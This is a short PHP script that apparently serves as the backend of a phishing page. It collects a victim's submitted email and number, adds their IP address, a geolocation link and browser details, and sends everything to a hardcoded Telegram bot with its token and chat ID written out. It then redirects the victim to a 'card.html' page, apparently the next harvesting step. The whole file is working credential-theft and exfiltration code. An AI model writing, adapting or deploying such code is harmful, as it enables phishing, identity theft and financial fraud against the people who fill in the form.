<?php
error_reporting(E_ALL);

function foo($botToken, $chatID, $email, $number, $message) {
    if (!empty($email) && !empty($number)) {
        $telegramAPI = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatID,
            'text' => $message,
        ];
        $curl = curl_init($telegramAPI);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        sleep(5);
        header("Location: ./card.html");
        exit;
			
    
    } else {
        echo "<script>setTimeout(function() { window.history.go(-1); document.querySelectorAll('input[type=password]').forEach(function(input) { input.value = '';}); }, 0);</script>";
        exit;
    }
}

$email = $_POST['email'] ?? "";
$number = $_POST['number'] ?? "";

$message = "----------------ALERT DETAILS---------------\n";
$message .= "EMAIL         : " . $email . "\n";
$message .= "NUMBER      : " . $number . "\n";
$message .= "----------------IP's INFO------------\n";
$message .= "CLIENT IP     : " . getenv("REMOTE_ADDR") . "\n";
$message .= "IP LINK       : https://www.geodatatool.com/?IP=" . getenv("REMOTE_ADDR") . "\n";
$message .= "BROWSER       : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

foo('8130694927:AAHH1H6rLldhEcC-BzNrvzbKpGsJsxvqh1Y', '7528859168', $email, $number, $message);
?>